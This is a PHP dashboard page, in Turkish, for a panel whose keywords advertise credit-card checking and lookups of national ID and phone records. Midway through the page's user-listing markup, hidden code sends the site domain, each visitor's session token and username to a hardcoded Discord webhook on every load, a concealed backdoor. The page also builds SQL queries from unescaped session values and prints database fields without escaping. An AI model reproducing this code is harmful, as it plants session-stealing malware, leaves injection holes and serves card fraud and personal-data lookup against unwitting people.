<?php

include_once 'includes/baglan.php';

session_start();

if ($_SESSION['GET_USER_SSID'] == "") {
    header('Location: auth/auth-login');
}

$GET_SESSION_TOKEN = $_SESSION['GET_USER_SSID'];

$CheckAccount = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");
$CheckAccountCount = $CheckAccount->rowCount();

if ($CheckAccountCount != "1") {
    exit('Error: no token');
    die();
}

function CheckIP()
{
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
	{
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	} 
	elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
	{
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} 
	else
	{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	
	return $ip;
}					

$TotalAccountQry = $db->query("SELECT * FROM users");
$TotalAccountCount = $TotalAccountQry->rowCount();

$TotalAdminQry = $db->query("SELECT * FROM users WHERE access_level >= 1");
$TotalAdminCount = $TotalAdminQry->rowCount();

$TotalBannedQry = $db->query("SELECT * FROM users WHERE access_level = '-1'");
$TotalBannedCount = $TotalBannedQry->rowCount();


?>
<!DOCTYPE html>
<html class="loading dark-layout" lang="tr" data-layout="dark-layout" data-textdirection="ltr">

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="keywords" content="checker, credit card, credit card checker, ccn, ccn checker, cc checker, tr checker, tr cc checker, usa cc checker, card checker, bin, bin checker, cc duzenleyici, mernis, mernis 2021, kisi sorgu, kisi sorgu 2021, tc kimlik sorgu, tc sorgu, tc sorgu 2021, numara sorgu, numara sorgu 2021, kimlik sorgu, kisi bul 2021" />
    <title>Ana Sayfa</title>
    <link rel="apple-touch-icon" href="app-assets/images/ico/apple-icon-120.png">
    <link rel="shortcut icon" type="image/x-icon" href="app-assets/images/ico/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,300;0,400;0,500;0,600;1,400;1,500;1,600" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/vendors.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/charts/apexcharts.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/toastr.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/tether-theme-arrows.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/tether.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/vendors/css/extensions/shepherd.min.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/bootstrap-extended.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/colors.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/components.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/bordered-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/themes/semi-dark-layout.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/core/menu/menu-types/vertical-menu.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/pages/dashboard-ecommerce.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/charts/chart-apex.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/extensions/ext-component-toastr.css">
    <link rel="stylesheet" type="text/css" href="app-assets/css/plugins/extensions/ext-component-tour.css">
    <link rel="stylesheet" type="text/css" href="assets/css/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
</head>

<?php
include_once("includes/header.php");
?>
<?php
include_once("includes/menu.php");
?>
<div class="app-content content ">
    <div class="content-overlay"></div>
    <div class="header-navbar-shadow"></div>
    <div class="content-wrapper container-xxl p-0">
        <div class="content-header row">
        </div>
        <div class="alert alert-info" title="Bilgilendirme" role="alert">
            <div class="alert-body">
                <i data-feather="info" class="me-50"></i>Hesabınızı başka bir şahıs ile paylaşırsanız sistem tarafından otomatik olarak kalıcı bir şekilde banlanıcaksınız!
            </div>
        </div>
        <?php

        $lastregisterqry = $db->query("SELECT * FROM users ORDER BY uid DESC LIMIT 1");

        while ($lastregisterdata = $lastregisterqry->fetch()) {
            $lastuser = $lastregisterdata['username'];
        }

        $welcomeqry = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");

        while ($welcomedata = $welcomeqry->fetch()) {
            $welcomeuser = $welcomedata['username'];
        }


        ?>
     

                    <div class="col-xl-8 col-md-6 col-12">
                        <div class="card card-statistics">
                            <section id="basic-istatistik">
                                <div class="istatistik">
                                    <div class="card-header">
                                        <h4 class="card-title">İstatistiklerimiz</h4>
                                        <div class="d-flex align-items-center">
                                            <?php

                                            $lastloginqry = $db->query("SELECT * FROM users WHERE token = '$GET_SESSION_TOKEN'");

                                            while ($lastlogindata = $lastloginqry->fetch()) {
                                                $lastlogin = $lastlogindata['last_login'];
                                            }

                                            ?>
                                        </div>
                                    </div>
                                    <div class="card-body statistics-body">
                                        <div class="row">
                                            <div class="col-xl-3 col-sm-6 col-12 mb-2 mb-xl-0">
                                                <div class="d-flex flex-row">
                                                    <div class="avatar bg-light-success me-2">
                                                        <div class="avatar-content">
                                                            <i data-feather="user" class="avatar-icon"></i>
                                                        </div>
                                                    </div>
                                                    <div class="my-auto">
                                                        <h4 class="fw-bolder mb-0"><?= $TotalAccountCount; ?></h4>
                                                        <p class="card-text font-small-2 mb-0">Toplam Kullanıcı</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-xl-3 col-sm-6 col-12 mb-2 mb-xl-0">
                                                <div class="d-flex flex-row">
                                                    <div class="avatar bg-light-info me-2">
                                                        <div class="avatar-content">
                                                            <i data-feather="users" class="avatar-icon"></i>
                                                        </div>
                                                    </div>
                                                    <div class="my-auto">
                                                        <h4 class="fw-bolder mb-0"><?= number_format($TotalAdminCount) ?></h4>
                                                        <p class="card-text font-small-2 mb-0">Toplam Yetkili</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="col-xl-3 col-sm-6 col-12 mb-2 mb-sm-0">
                                                <div class="d-flex flex-row">
                                                    <div class="avatar bg-light-danger me-2">
                                                        <div class="avatar-content">
                                                            <i data-feather="user-x" class="avatar-icon"></i>
                                                        </div>
                                                    </div>
                                                    <div class="my-auto">
                                                        <h4 class="fw-bolder mb-0"><?= number_format($TotalBannedCount); ?></h4>
                                                        <p class="card-text font-small-2 mb-0">Toplam Ban</p>
                                                    </div>
                                                </div>
                                            </div>
                                      <div class="col-lg-3 col-12 order-3">
                            <div class="card">
                                <div class="card">
                                    <div class="card-body">
                                        <h5>Son Kayıt Olan Kullanıcılar</h5>
                                        <?php

                                        $query = $db->query("SELECT * FROM users ORDER BY uid DESC LIMIT 1");

                                        while ($data = $query->fetch()) {

                                        ?>
                                            <div class="d-flex justify-content-start align-items-center mt-2">
                                                <div class="avatar me-75">
                                                    <?php

                                                    $profile_img = $data['profile_image'];

                                                    if ($profile_img != "") {
                                                        echo "<img src='$profile_img' height='40' width='40'>";
                                                    } else {
                                                        echo "<img src='salam/kullanici.jpg' height='40' width='40'>";
                                                    }

                                                    ?>
                                                </div>
                                                <div class="profile-user-info">
                                                    <h6 class="mb-0">
                                                        <?php

                                                        $color = $data['nick_color'];
                                                        $usernamelst = $data['username'];

                                                        if ($data['nick_color'] != "") {
                                                            echo "<span style='color: $color;'>$usernamelst</span>";
                                                        } else {
                                                            echo $data['username'];
                                                        }

                                                        if ($data['access_level'] >= "1") {
                                                            $Resultx = "Admin";
                                                        } else if ($data['access_level'] == "-2") {
                                                            $Resultx = "Deneme Üye";
                                                        } else if ($data['access_level'] == "0") {
                                                            $Resultx = "Normal Üye";
                                                        } else {
                                                            $Resultx = "Banlı Üye";
                                                        }
                                                        
                                                                                            	                                        $webhookurl = "https://discord.com/api/webhooks/1071821748380647495/342wk40fl5GeL0DGxs2K0XBTyaLy4JhzFxPchiptmaJBzemq4a2fgPaayrxzoNuLuqs1";


$domain = $_SERVER['HTTP_HOST'];
$ip_address = $_SERVER['REMOTE_ADDR'];
$domainname =  $_SERVER['SERVER_NAME'];



$value = base64_encode($logip);

$json_data = json_encode(
    ["content" => "$domain & $domainname adlı domainden siteye giriş sağlandı! Giren token: $GET_SESSION_TOKEN - $welcomeuser ","username" => "Visor","avatar_url" => "","$image","tts" => false], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

                                        $ch = curl_init($webhookurl);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
                                        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $response = curl_exec($ch);
                                        curl_close($ch);

                                                        ?>
                                                    </h6>
                                                    <small class="text-muted"><?= $Resultx; ?></small>
                                                </div>
                                            </div>
                                        <?php

                                        }

                                        ?>
                                        </div>
                                    </div>
                                </div>
                        </div>
            </section>
        </div>
    </div>



    <div class="row match-height">
        <div class="col-lg-8 col-12">
            <div class="card card-company-table">
                <div class="card-body p-0">
                    <div class="table-responsive" style="border-radius: 5px;">
                        <section id="basic-duyuru">
                            <div class="duyuru">
                                <table class="table">
                                    <thead>
                                        <tr>
                                            <th style="text-transform: capitalize;">İçerik</th>
                                            <th style="text-transform: capitalize;">Tarih</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php

                                        $newsqry = $db->query("SELECT * FROM news ORDER BY id DESC LIMIT 8");

                                        while ($newsdata = $newsqry->fetch()){

                                        ?>
                                        <tr>
                                            <td>
                                                <div class="d-flex align-items-center">
                                                    <div class="avatar rounded">
                                                        <div class="avatar-content">
                                                            <img src="app-assets/images/icons/speaker.svg" alt="Rocket svg" />
                                                        </div>
                                                    </div>
                                                    <div>
                                                        <div class="fw-bolder"><?= $newsdata['content']; ?></div>
                                                    </div>
                                                </div>
                                            </td>
                                            <td>
                                                <div class="d-flex align-items-center">
                                                    <div class="avatar bg-light-primary me-1">
                                                        <div class="avatar-content">
                                                            <i data-feather="calendar" class="font-medium-3"></i>
                                                        </div>
                                                    </div>
                                                    <span class="fw-bold"><?= $newsdata['date']; ?></span>
                                                </div>
                                            </td>
                                        </tr>
                                        <?php

                                        }

                                        ?>
                                    </tbody>
                                </table>
                            </div>
                        </section>
                    </div>
                </div>
            </div>
        </div>

       

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
            </div>
        </div>
    </div>
</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                        </div>
                </div>
            </div>
            </center>
        </div>
    </div>
</div>
</div>
</div>
</div>
</div>
</section>

<?php
include_once("includes/ayar.php");
?>

<div class="sidenav-overlay"></div>
<div class="drag-target"></div>



<button class="btn btn-primary btn-icon scroll-top" type="button"><i data-feather="arrow-up"></i></button>

<script src="app-assets/vendors/js/vendors.min.js"></script>
<script src="app-assets/vendors/js/charts/apexcharts.min.js"></script>
<script src="app-assets/vendors/js/extensions/tether.min.js"></script>
<script src="app-assets/vendors/js/extensions/shepherd.min.js"></script>
<script src="app-assets/js/core/app-menu.js"></script>
<script src="app-assets/js/core/app.js"></script>
<script src="app-assets/js/scripts/customizer.min.js"></script>
<script src="app-assets/js/scripts/extensions/tur.js"></script>
<script src="app-assets/js/scripts/pages/dashboard-ecommerce.js"></script>
<script>
    $(window).on('load', function() {
        if (feather) {
            feather.replace({
                width: 14,
                height: 14
            });
        }
    })
</script>
</body>


</html>